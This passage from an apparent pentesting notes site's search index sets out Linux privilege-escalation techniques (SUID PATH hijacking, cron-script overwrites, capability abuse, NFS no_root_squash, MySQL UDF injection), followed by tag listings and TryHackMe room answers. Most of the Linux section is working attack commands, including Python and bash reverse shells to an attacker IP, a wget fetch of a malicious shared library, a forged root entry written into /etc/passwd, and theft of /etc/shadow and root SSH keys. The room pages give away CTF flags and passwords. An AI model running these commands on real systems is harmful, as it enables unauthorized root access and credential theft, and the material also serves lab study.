\u201cNumerical\u201d method or \u201cSymbolic\u201d method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation. Basic Enumeration GUID permission is similar to the SUID permission, only difference is \u2013 when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member Enumeration: find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l find / -perm -g = s -type f 2 >/ dev / null | xargs ls -l find / -perm - 4000 -type f -exec ls -la {} 2 >/ dev / null \\; find / -uid 0 -perm - 4000 -type f 2 >/ dev / null // Look for any binaries that seem odd . Any binaries running from a users home directory ? // Check the version of any odd binaries and see if there are any public expliots that can be used to gain root","title":"SUID / GUID Binaries Overview"},{"location":"notes/privilege-escalation/linux/#suid-path-environmental-variable","text":"PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands. View PATH echo $PATH env | grep PATH print $PATH Example 1 Create a Simple Basic SUID binary cd / home / max / vi test . c #include<unistd.h> void main () { setuid ( 0 ); setgid ( 0 ); system ( \"curl -I 127.0.0.1\" ); } Compile Binary & Add SUID Bit gcc test . c -o network-tester chmod u + s network-tester mv network-tester / bin / tools / Example 1 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / network-tester ls -la / bin / tools / network-tester Test the SUID Binary / bin / tools / network-tester strings / bin / tools / network-tester Output Example : curl -I 127 . 0 . 0 . 1 Absue the SUID Binary echo \"/bin/bash\" > / tmp / curl chmod 777 / tmp / curl echo $PATH export PATH =/ tmp : $PATH / bin / tools / network-tester id && whoami Example 3 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : service apache2 status Absue the SUID Binary echo 'int mian() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}' > / tmp / service . c gcc / tmp / service . c -o / tmp / service chmod 777 / tmp / service export PATH =/ tmp : $PATH echo $PATH / bin / tools / webserver-status id && whoami Example 4 (With full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : / usr / sbin / service apache2 status Absue the SUID Binary fucntion / usr / sbin / service () { cp / bin / bash / tmp && chmod + s / tmp / bash && / tmp / bash -p ; } export -f / usr / sbin / service / bin / tools / webserver-status id && whoami Example 5 (/bin/systemctl) Privilege Escalation Copy line by line inside the victim low priv shell TF =$( mktemp ). service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"chmod +s /bin/bash > /tmp/output\" [Install] WantedBy=multi-user.target' > $TF systemctl link $TF systemctl enable - -now $TF / bin / bash -p id && whoami Example 5 (Copy - /bin/cp) Privilege Escalation Victim find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Copy the contents of / etc / passwd to your local machine inside a new file called \"passwd\" Attacker Run the following command locally : openssl passwd - 1 -salt ignite NewRootPassword Copy the output Add the following inside the local passwd file echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> passwd // Replace < output > with the copied output python -m SimpleHTTPServer 9000 Victim wget -O / tmp / passwd http :// 10 . 10 . 10 . 10 : 9000 / passwd cp / tmp / passwd / etc / passwd su root2 Password : NewRootPassword id && whoami // Replace Attacker IP & Port","title":"SUID PATH Environmental Variable"},{"location":"notes/privilege-escalation/linux/#cron-tabs-scheduled-tasks","text":"Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals Enumeration contab -l / etc / init . d / etc / cron * / etc / crontab / etc / cron . allow / etc / cron . d / etc / cron . deny / etc / cron . daily / etc / cron . hourly / etc / cron . monthly / etc / cron . weekly Example 1 Privilege Escalation via Nonexistent File Overwrite cat / etc / crontab Output Example : * * * * * root systemupdate . sh echo 'chmod +s /bin/bash' > / home / user / systemupdate . sh chmod + x / home / user / systemupdate . sh Wait a while / bin / bash -p id && whoami Example 2 Privilege Escalation via Root Executable Bash Script cat / etc / crontab Output Example : * * * * * root / usr / bin / local / network-test . sh echo \"chmod +s /bin/bash\" >> / usr / bin / local / network-test . sh Wait a while id && whomai Example 3 Privilege Escalation via Root Executable Python Script Overwrite Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import socket import subprocess import os s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.10.10.10\" , 443 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/bash\" , \"-i\" ]); // Replace the IP & Port // Save & Exit the Script Attacker nc -lvnp 443 OR Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import os os . system ( \"chmod +s /bin/bash\" ) // Save & Exit the Script Wait a While / bin / bash -p id && whoami Example 4 Privilege Escalation via Tar Bash Script (WildCards) cat / etc / crontab Output Example : * * * * * root / usr / bin / local / mysql-db-backup . sh cat / usr / bin / local / mysql-db-backup . sh Output of Script : -------------------------------- #!/bin/bash cd / var / www / html / tar czf / tmp / dbbackup . tar . gz * -------------------------------- cd / var / www / html / echo \"#!/bin/bash\" > priv . sh echo \"chmod +s /bin/bash\" >> priv . sh chmod + x priv . sh touch / var / www / html /- -checkpoint = 1 touch / var / www / html /- -checkpoint-action = exec = sh \\ priv . sh Wait a while / bin / bash -p id && whomai Example 5 Privilege Escalation via Tar Cron Job cat / etc / crontab Output Example : */ 1 * * * * root tar -zcf / var / backups / html . tgz / var / www / html /* cd / var / www / html / echo \"chmod +s /bin/bash\" > priv . sh echo \"\" > \"--checkpoint-action=exec=bash priv.sh echo \"\" > --checkpoint=1 tar cf archive.tar * // If it does not work , replace \" bash \" with \" sh \"","title":"Cron Tabs &amp; Scheduled Tasks"},{"location":"notes/privilege-escalation/linux/#capabilities","text":"Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0). Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root. Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file. Python Perl Tar OpenSSL Python getcap -r / 2 >/ dev / null / usr / bin / python2 . 6 = cap_setuid + ep / usr / bin / python2 . 6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami OR getcap -r / 2 >/ dev / null / usr / bin / python3 = cap_setuid + ep / usr / bin / python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami Perl getcap -r / 2 >/ dev / null / usr / bin / perl = cap_setuid + ep / usr / bin / perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";' id && whoami Tar Method 1 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf shadow . tar / etc / shadow / usr / bin / tar -xvf shadow . tar cat etc / shadow Copy content of users accounts to a local file called shadow Attacker john shadow - -wordlist =/ usr / share / wordlists / rockyou . txt Crack root ' s credentials Victim su root id && whoami Method 2 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf key . tar / root /. ssh / id_rsa / usr / bin / tar -xvf key . tar cat id_rsa # Download id_rsa to attacker machine Attacker chmod 600 id_rsa ssh -i id_rsa root @< victim_ip > id && whoami OpenSSL Victim getcap -r / 2 >/ dev / null / usr / bin / openssl = cap_setuid + ep Attacker Create a .so file - Code below vi priv.c #include <openssl/engine.h> #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> static const char * engine_id = \"test\" ; static const char * engine_name = \"hope it works\" ; static int bind ( ENGINE * e , const char * id ) { int ret = 0 ; if (! ENGINE_set_id ( e , engine_id )) { fprintf ( stderr , \"ENGINE_set_id failed\\n\" ); goto end ; } if (! ENGINE_set_name ( e , engine_name )) { printf ( \"ENGINE_set_name failed\\n\" ); goto end ; } setuid ( 0 ); setgid ( 0 ); system ( \"chmod +s /bin/bash\" ); system ( \"echo Complete!\" ); ret = 1 ; end : return ret ; } IMPLEMENT_DYNAMIC_BIND_FN ( bind ) IMPLEMENT_DYNAMIC_CHECK_FN () Compile Code & Create .so file gcc -c fPIC priv . c -o priv gcc -shared -o priv . so -lcrypto priv Victim Download .so from Attacker wget -O / tmp / priv . so http :// 10 . 10 . 10 . 10 : 9000 / priv . so // Replace IP & Port Get Root openssl req -engine /tmp/priv.so /bin/bash -p id && whoami","title":"Capabilities"},{"location":"notes/privilege-escalation/linux/#nfs-root-squashing","text":"Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network. rw: Permit clients to read as well as write access to the shared directory. ro: Permit clients to Read-only access to shared directory. root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account. no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication. async: It will speed up transfers but can cause data corruption as NFS server doesn\u2019t wait for the complete write operation to be finished on the stable storage, before replying to the client. sync: The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage. Enumeration Victim cat / etc / exports // Do we see any no_root_squash enabled on a mounted share ? / tmp *( rw , sync , insecure , no_root_squash , no , subtree , check ) Attacker nmap -sV - -script = nfs-showmount < victim_ip > Privilege Escalation Attacker showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > / tmp / mount / priv . c gcc / tmp / mount / priv . c -o / tmp / mount / priv chmod + s / tmp / mount / priv OR showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount cd / tmp / mount cp / bin / bash . chmod + s bash Victim cd / tmp ./ priv id && whoami OR cd / tmp ./ bash -p id && whoami","title":"NFS Root Squashing"},{"location":"notes/privilege-escalation/linux/#chkrootkit-049","text":"Expliot: https://www.exploit-db.com/exploits/33899 cat /etc/cron.daily /usr/bin/chkrootkit ls -la /usr/bin/chkrootkit // Do we have SUID? chkrootkit -V echo \"#!/bin/bash\" > /tmp/update echo \"chmod +s /bin/bash\" >> /tmp/update Wait a While ... /bin/bash -p id && whoami","title":"chkrootkit 0.49"},{"location":"notes/privilege-escalation/linux/#tmux","text":"tmux is a terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time. Tmux Cheat Sheet: https://tmuxcheatsheet.com/ Privilege Escalation tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /tmp/tmux-14/default-root // Replace Path to Socket (Depending on your results) OR tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /opt/.dev/gbm/ attach -t 0 // Replace Path to Session (Depending on your results)","title":"Tmux"},{"location":"notes/privilege-escalation/linux/#mysql-running-as-root","text":"Example 1 ps aux | grep root mysql -u root -p \\! chmod + s / bin / bash exit ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 2 Victim ps aux | grep root mysql -u root -p \\! bash -i >& / dev / tcp / 10 . 10 . 10 . 10 / 9999 0 >& 1 Attacker nc -lvnp 9999 id && whoami","title":"MySQL Running as root"},{"location":"notes/privilege-escalation/linux/#mysql-udf-user-defined-functions-code-udf-injection","text":"User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat() UDFs are useful when you need to extend the functionality of your MySQL server For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution Example 1 - Reverse Shell Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1' ); // Any UDF library can be used , as long as it is exploitable via the sys_exec () function // The \"admin\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port Attacker nc -lvnp 9999 Example 2 (Local via SUID) Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'chmod +s /bin/bash' ); mysql > exit Wait a while ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 3 (Explioting MySQL 4.x/5.0 (Linux)) UDF Link: https://www.exploit-db.com/exploits/1518 Victim wget -O priv . c https :// www . exploit-db . com / download / 1518 gcc \u2013 g \u2013 shared \u2013 Wl , \u2013 soname , priv . so \u2013 o priv . so priv . c \u2013 lc chmod 777 priv . so mv priv . so / tmp / mysql -u root -p mysql > create table priv ( line blob ); mysql > insert into priv values ( load_file ( \u2018 / tmp / priv . so \u2019 )); mysql > select * from priv into dumpfile \u2018 / usr / lib / mysql / plugin / priv . so \u2019 ; mysql > create function do_system returns integer soname \u2018 priv . so \u2019 ; mysql > select do_system ( \u2018 chmod + s / bin / bash \u2019 ); mysql >! sh / bin / bash -p id && whoami // priv . c can be called anything // The \"priv\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port","title":"MySQL UDF (User-Defined Functions) Code (UDF) Injection"},{"location":"notes/privilege-escalation/windows/","tags":["Privilege Escalation","Windows"],"text":"Windows Privilege Escalation \u00b6 Privilege Escalation Methods \u00b6 Basic System Enumeration Finding clear text credentials GPP (Group Policy Preference) Secrets dump via SAM (VHD Mounted Share) Kernel Expliots AlwaysInstallElevated DNSAdmin DLL Injection RunAs with Saved Credentials BinPATH Service Re-Direct - Weak Permissions USP (Unquoted Service Path) SeImpersonate / SeAssignPrimaryToken - Service Accounts MSSQL via UDF User Defined Function","title":"Windows Privilege Escalation"},{"location":"notes/privilege-escalation/windows/#windows-privilege-escalation","text":"","title":"Windows Privilege Escalation"},{"location":"notes/privilege-escalation/windows/#privilege-escalation-methods","text":"Basic System Enumeration Finding clear text credentials GPP (Group Policy Preference) Secrets dump via SAM (VHD Mounted Share) Kernel Expliots AlwaysInstallElevated DNSAdmin DLL Injection RunAs with Saved Credentials BinPATH Service Re-Direct - Weak Permissions USP (Unquoted Service Path) SeImpersonate / SeAssignPrimaryToken - Service Accounts MSSQL via UDF User Defined Function","title":"Privilege Escalation Methods"},{"location":"notes/reverse-shell/","tags":["Reverse Shell"],"text":"Reverse Shell Cheatsheet \u00b6 https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/","title":"Reverse Shell Cheatsheet"},{"location":"notes/reverse-shell/#reverse-shell-cheatsheet","text":"https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/","title":"Reverse Shell Cheatsheet"},{"location":"s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/","text":"Waste \u00b6 Reconnaissance \u00b6 Domain \u00b6 https://dnsdumpster.com/ https://www.shodan.io/ https://web.archive.org/web/*/<domain>* Javascript-obfuscate \u00b6 https://reqbin.com/code/javascript https://www.cleancss.com/javascript-obfuscate/index.php http://deobfuscatejavascript.com/# Hash \u00b6 https://emn178.github.io/online-tools/sha256.html","title":"Waste"},{"location":"s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/#waste","text":"","title":"Waste"},{"location":"s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/#reconnaissance","text":"","title":"Reconnaissance"},{"location":"s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/#domain","text":"https://dnsdumpster.com/ https://www.shodan.io/ https://web.archive.org/web/*/<domain>*","title":"Domain"},{"location":"s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/#javascript-obfuscate","text":"https://reqbin.com/code/javascript https://www.cleancss.com/javascript-obfuscate/index.php http://deobfuscatejavascript.com/#","title":"Javascript-obfuscate"},{"location":"s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/#hash","text":"https://emn178.github.io/online-tools/sha256.html","title":"Hash"},{"location":"tags/tags/","text":"Categories \u00b6 247CTF \u00b6 NAME Acid flag Bank Administrative Orm Compare the pair Flag Authoriser Forgotten File Pointer Secured Session Slippery Upload The Twig Injector Trusted Client Authorisation Bypass \u00b6 Authorisation Bypass Authorisation Bypass Brute Force \u00b6 Brute Force CSP \u00b6 CSP Bypass CSRF \u00b6 Cross Site Request Forgery CVE-2019-14287 \u00b6 Year of the Rabbit Cyber Kill Chain \u00b6 Cyber Kill Chain DVWA \u00b6 Authorisation Bypass Authorisation Bypass Brute Force Command Injection Cross Site Request Forgery CSP Bypass File Inclusion File Upload JavaScript Open HTTP Redirect SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS Reflected XSS Stored Investigating Windows \u00b6 Investigating Windows JavaScript \u00b6 JavaScript Linux \u00b6 Linux Privilege Escalation Linux Privilege Escalation \u00b6 Root Me Open HTTP Redirect \u00b6 Open HTTP Redirect Privilege Escalation \u00b6 Linux Privilege Escalation Windows Privilege Escalation Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF Grep Ignite LazyAdmin Lesson Learned? Lian_Yu Relevant Skynet Startup tomghost CTF Wgel Wonderland Year of the Rabbit Year of the Fox Red Teaming - Post Compromise \u00b6 Windows Local Persistence Reverse Shell \u00b6 Reverse Shell Cheatsheet SQL Injection \u00b6 Simple CTF THM-Room \u00b6 Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF TryHackMe - Empire Enumeration Grep Hydra Ignite TryHackMe - Intro to C2 Investigating Windows Cyber Kill Chain TryHackMe - Hacking with Powershell - Walkthrough Init Access Weaponization The Lay of the Land Windows Local Persistence LazyAdmin Lesson Learned? Lian_Yu TryHackMe - Metasploit Relevant Password Attacks Phishing Printer Hacking 101 Root Me Skynet Startup tomghost Traverse CTF Wgel Wonderland Year of the Rabbit Year of the Fox Weak Session IDs \u00b6 Weak Session IDs Windows \u00b6 Windows Privilege Escalation XSS \u00b6 XSS (DOM) XSS Reflected XSS Stored XSS DOM \u00b6 XSS (DOM) XSS Reflected \u00b6 XSS Reflected XSS Stored \u00b6 XSS Stored","title":"Categories"},{"location":"tags/tags/#categories","text":"","title":"Categories"},{"location":"tags/tags/#247ctf","text":"NAME Acid flag Bank Administrative Orm Compare the pair Flag Authoriser Forgotten File Pointer Secured Session Slippery Upload The Twig Injector Trusted Client","title":"247CTF"},{"location":"tags/tags/#authorisation-bypass","text":"Authorisation Bypass Authorisation Bypass","title":"Authorisation Bypass"},{"location":"tags/tags/#brute-force","text":"Brute Force","title":"Brute Force"},{"location":"tags/tags/#csp","text":"CSP Bypass","title":"CSP"},{"location":"tags/tags/#csrf","text":"Cross Site Request Forgery","title":"CSRF"},{"location":"tags/tags/#cve-2019-14287","text":"Year of the Rabbit","title":"CVE-2019-14287"},{"location":"tags/tags/#cyber-kill-chain","text":"Cyber Kill Chain","title":"Cyber Kill Chain"},{"location":"tags/tags/#dvwa","text":"Authorisation Bypass Authorisation Bypass Brute Force Command Injection Cross Site Request Forgery CSP Bypass File Inclusion File Upload JavaScript Open HTTP Redirect SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS Reflected XSS Stored","title":"DVWA"},{"location":"tags/tags/#investigating-windows","text":"Investigating Windows","title":"Investigating Windows"},{"location":"tags/tags/#javascript","text":"JavaScript","title":"JavaScript"},{"location":"tags/tags/#linux","text":"Linux Privilege Escalation","title":"Linux"},{"location":"tags/tags/#linux-privilege-escalation","text":"Root Me","title":"Linux Privilege Escalation"},{"location":"tags/tags/#open-http-redirect","text":"Open HTTP Redirect","title":"Open HTTP Redirect"},{"location":"tags/tags/#privilege-escalation","text":"Linux Privilege Escalation Windows Privilege Escalation Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF Grep Ignite LazyAdmin Lesson Learned? Lian_Yu Relevant Skynet Startup tomghost CTF Wgel Wonderland Year of the Rabbit Year of the Fox","title":"Privilege Escalation"},{"location":"tags/tags/#red-teaming-post-compromise","text":"Windows Local Persistence","title":"Red Teaming - Post Compromise"},{"location":"tags/tags/#reverse-shell","text":"Reverse Shell Cheatsheet","title":"Reverse Shell"},{"location":"tags/tags/#sql-injection","text":"Simple CTF","title":"SQL Injection"},{"location":"tags/tags/#thm-room","text":"Name Athena Basic Pentesting Blog Brooklyn Nine Nine Brute It Cyborg Simple CTF TryHackMe - Empire Enumeration Grep Hydra Ignite TryHackMe - Intro to C2 Investigating Windows Cyber Kill Chain TryHackMe - Hacking with Powershell - Walkthrough Init Access Weaponization The Lay of the Land Windows Local Persistence LazyAdmin Lesson Learned? Lian_Yu TryHackMe - Metasploit Relevant Password Attacks Phishing Printer Hacking 101 Root Me Skynet Startup tomghost Traverse CTF Wgel Wonderland Year of the Rabbit Year of the Fox","title":"THM-Room"},{"location":"tags/tags/#weak-session-ids","text":"Weak Session IDs","title":"Weak Session IDs"},{"location":"tags/tags/#windows","text":"Windows Privilege Escalation","title":"Windows"},{"location":"tags/tags/#xss","text":"XSS (DOM) XSS Reflected XSS Stored","title":"XSS"},{"location":"tags/tags/#xss-dom","text":"XSS (DOM)","title":"XSS DOM"},{"location":"tags/tags/#xss-reflected","text":"XSS Reflected","title":"XSS Reflected"},{"location":"tags/tags/#xss-stored","text":"XSS Stored","title":"XSS Stored"},{"location":"tryhackme/room/","text":"Room \u00b6 Choose a level: Easy Medium Hard","title":"Machines"},{"location":"tryhackme/room/#room","text":"Choose a level: Easy Medium Hard","title":"Room"},{"location":"tryhackme/room/template/","tags":["THM-Room","Privilege Escalation"],"text":"Name \u00b6 Room at https://tryhackme.com/room/Name List of the questions solved Question: name Ans: name Pentest scenario \u00b6 Reconnaissance \u00b6 Init Access \u00b6 Privilege Escalation \u00b6 What we learned \u00b6","title":"Name"},{"location":"tryhackme/room/template/#name","text":"Room at https://tryhackme.com/room/Name List of the questions solved Question: name Ans: name","title":"Name"},{"location":"tryhackme/room/template/#pentest-scenario","text":"","title":"Pentest scenario"},{"location":"tryhackme/room/template/#reconnaissance","text":"","title":"Reconnaissance"},{"location":"tryhackme/room/template/#init-access","text":"","title":"Init Access"},{"location":"tryhackme/room/template/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"tryhackme/room/template/#what-we-learned","text":"","title":"What we learned"},{"location":"tryhackme/room/4th3n4/","tags":["THM-Room","Privilege Escalation"],"text":"Athena \u00b6 Room at https://tryhackme.com/room/4th3n4 List of the questions solved Question: What is the user flag? Ans: 857c4a4fbac638afb6c7ee45eb3e1a28 Question: What is the root flag? Ans: aecd4a3497cd2ec4bc71a2315030bd48 Pentest scenario \u00b6 Reconnaissance \u00b6 Init Access \u00b6 Privilege Escalation \u00b6 Some problems \u00b6 What we learned \u00b6","title":"Athena"},{"location":"tryhackme/room/4th3n4/#athena","text":"Room at https://tryhackme.com/room/4th3n4 List of the questions solved Question: What is the user flag? Ans: 857c4a4fbac638afb6c7ee45eb3e1a28 Question: What is the root flag? Ans: aecd4a3497cd2ec4bc71a2315030bd48","title":"Athena"},{"location":"tryhackme/room/4th3n4/#pentest-scenario","text":"","title":"Pentest scenario"},{"location":"tryhackme/room/4th3n4/#reconnaissance","text":"","title":"Reconnaissance"},{"location":"tryhackme/room/4th3n4/#init-access","text":"","title":"Init Access"},{"location":"tryhackme/room/4th3n4/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"tryhackme/room/4th3n4/#some-problems","text":"","title":"Some problems"},{"location":"tryhackme/room/4th3n4/#what-we-learned","text":"","title":"What we learned"},{"location":"tryhackme/room/_index/easy/","text":"Room \u00b6 Grep Lesson Learned? Traverse Brute It Year of the Rabbit CTF wgel CyBorg Ignite Brooklyn Nine Nine tomghost Startup Skynet Simple CTF LazyAdmin RootMe Basic Pentesting Lian_Yu","title":"Room"},{"location":"tryhackme/room/_index/easy/#room","text":"Grep Lesson Learned? Traverse Brute It Year of the Rabbit CTF wgel CyBorg Ignite Brooklyn Nine Nine tomghost Startup Skynet Simple CTF LazyAdmin RootMe Basic Pentesting Lian_Yu","title":"Room"},{"location":"tryhackme/room/_index/hard/","text":"Room \u00b6 Year of the Fox","title":"Room"},{"location":"tryhackme/room/_index/hard/#room","text":"Year of the Fox","title":"Room"},{"location":"tryhackme/room/_index/medium/","text":"Room \u00b6 Athena Blog Wonderland","title":"Room"},{"location":"tryhackme/room/_index/medium/#room","text":"Athena Blog Wonderland","title":"Room"},{"location":"tryhackme/room/basic-pentesting/","tags":["THM-Room","Privilege Escalation"],"text":"Basic Pentesting \u00b6 Link room: https://tryhackme.com/room/basicpentestingjt Task 1: Web App Testing and Privilege Escalation \u00b6 In these set of tasks you'll learn the following: brute forcing hash cracking service enumeration Linux Enumeration The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file. Credits to Josiah Pierce from Vulnhub. Answer the questions below Deploy the machine and connect to our network Answer No needed answer Find the services exposed by the machine Answer No needed answer What is the name of the hidden directory on the web server(enter name without /)? Answer Explain development Use gobuster tool to find directory User brute-forcing to find the username & password Answer Explain jan Use enum4linux -a HOST What is the username? Answer jan What is the password? Answer armando What service do you use to access the server(answer in abbreviation in all caps)? Answer No needed answer Enumerate the machine to find any vectors for privilege escalation Answer No needed answer What is the name of the other user you found(all lower case)? Answer kay If you have found another user, what can you do with this information? Answer No needed answer What is the final password you obtain? Answer heresareallystrongpasswordthatfollowsthepasswordpolicy $$","title":"Basic Pentesting"},{"location":"tryhackme/room/basic-pentesting/#basic-pentesting","text":"Link room: https://tryhackme.com/room/basicpentestingjt","title":"Basic Pentesting"},{"location":"tryhackme/room/basic-pentesting/#task-1-web-app-testing-and-privilege-escalation","text":"In these set of tasks you'll learn the following: brute forcing hash cracking service enumeration Linux Enumeration The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file. Credits to Josiah Pierce from Vulnhub. Answer the questions below Deploy the machine and connect to our network Answer No needed answer Find the services exposed by the machine Answer No needed answer What is the name of the hidden directory on the web server(enter name without /)? Answer Explain development Use gobuster tool to find directory User brute-forcing to find the username & password Answer Explain jan Use enum4linux -a HOST What is the username? Answer jan What is the password? Answer armando What service do you use to access the server(answer in abbreviation in all caps)? Answer No needed answer Enumerate the machine to find any vectors for privilege escalation Answer No needed answer What is the name of the other user you found(all lower case)? Answer kay If you have found another user, what can you do with this information? Answer No needed answer What is the final password you obtain? Answer heresareallystrongpasswordthatfollowsthepasswordpolicy $$","title":"Task 1: Web App Testing and Privilege Escalation"},{"location":"tryhackme/room/blog/","tags":["THM-Room","Privilege Escalation"],"text":"Blog \u00b6 Room at https://tryhackme.com/room/blog List of the questions solved Question: root.txt 9a0b2b618bef9bfa7ac28c1353d9f318 Question: user.txt c8421899aae571f7af486492b71a8ab7 Question: Where was user.txt found? /media/usb Question: What CMS was Billy using? WordPress Question: What version of the above CMS was being used? 5.0 Pentest scenario \u00b6 Host: 10.10.184.240 C\u00e0i \u0111\u1eb7t ban \u0111\u1ea7u: M\u1edf file hosts t\u1ea1i /etc/hosts Th\u00eam d\u00f2ng 10.10.184.240 blog.thm v\u00e0o cu\u1ed1i file L\u01b0u file Truy c\u1eadp website th\u00f4ng qua domain blog.thm Reconnaissance \u00b6 Giao di\u1ec7n website \u0110\u00e2y l\u00e0 m\u1ed9t website \u0111\u01b0\u1ee3c 